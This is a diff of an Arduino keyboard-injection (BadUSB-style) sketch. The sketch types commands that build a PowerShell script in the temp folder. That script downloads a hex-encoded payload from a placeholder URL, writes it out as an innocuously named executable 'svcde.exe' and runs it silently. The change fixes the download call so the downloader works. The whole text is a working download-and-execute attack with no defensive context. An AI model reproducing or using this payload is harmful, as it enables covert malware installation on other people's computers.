@@ -18,7 +18,7 @@ void setup(){
   
   Keyboard.println("echo $wc = New-Object System.Net.WebClient > %temp%\\dl.ps1");
   Keyboard.println("echo $url = \"INPUT0\" >> %temp%\\dl.ps1");
-  Keyboard.println("echo [string]$hex = $wc.dlString($url) >> %temp%\\dl.ps1");
+  Keyboard.println("echo [string]$hex = $wc.DownloadString($url) >> %temp%\\dl.ps1");
   Keyboard.println("echo [Byte[]] $temp = $hex -split ' ' >> %temp%\\dl.ps1");
   Keyboard.println("echo [System.IO.File]::WriteAllBytes(\"%TEMP%\\svcde.exe\", $temp) >> %temp%\\dl.ps1");
   Keyboard.println("echo start-process -nonewwindow \"%TEMP%\\svcde.exe\" >> %temp%\\dl.ps1");
